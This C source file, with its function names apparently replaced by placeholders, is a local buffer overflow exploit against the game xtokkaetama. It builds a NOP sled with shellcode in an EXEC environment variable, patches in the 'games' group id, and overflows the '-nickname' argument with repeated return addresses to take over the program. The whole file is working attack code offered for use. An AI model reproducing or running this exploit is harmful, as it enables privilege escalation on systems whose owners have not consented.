#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct group {int gr_gid; } ;

/* Variables and functions */
 char* PATH ; 
 int* exec ; 
 scalar_t__ FUNC0 (char*,char*,char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 struct group* FUNC2 (char*) ; 
 scalar_t__ FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC5 (char*,...) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (char*,int*) ; 
 int FUNC9 (int*) ; 

int FUNC10(){
 unsigned int i;
 char *buf;
 struct group *gent;
 FUNC5("(*)xtokkaetama[v1.0b+]: local buffer overflow exploit.\n");
 FUNC5("(*)by: v9@fakehalo.deadpig.org / fakehalo.\n\n");
 if(!(buf=(char *)FUNC3(16384+1)))FUNC1(1);
 FUNC4(buf,0x90,(16384-FUNC9(exec)));
 if(!(gent=FUNC2("games")))exec[5]=exec[7]=20;
 else{exec[5]=exec[7]=gent->gr_gid;}
 FUNC8(buf,exec);
 FUNC6("EXEC",buf,1);
 FUNC4(buf,0x0,(16384+1));
 for(i=0;i<512;i+=4){*(long *)&buf[i]=0xbfffe001;} 
 FUNC5("[*] in the game, hit: spacebar, \"Q\", spacebar, spacebar.\n");
 FUNC7(3);
 FUNC5("[*] entering xtokkaetama...\n");
 if(FUNC0(PATH,PATH,"-nickname",buf,0))
  FUNC5("[!] failed to execute %s.\n",PATH);
 FUNC1(0);
}